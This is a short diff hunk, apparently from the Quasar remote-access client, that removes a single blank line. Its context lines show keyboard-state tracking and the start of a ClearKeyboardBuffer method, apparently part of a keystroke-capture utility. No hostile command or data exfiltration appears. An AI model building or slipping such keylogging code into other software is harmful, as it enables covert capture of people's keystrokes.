@@ -115,7 +115,6 @@ namespace Quasar.Client.Utilities
             lastKeyState = (byte[])currentKeyboardState.Clone();
         }
 
-
         private static void ClearKeyboardBuffer(int vk, int sc, IntPtr hkl)
         {
             var sb = new StringBuilder(10);
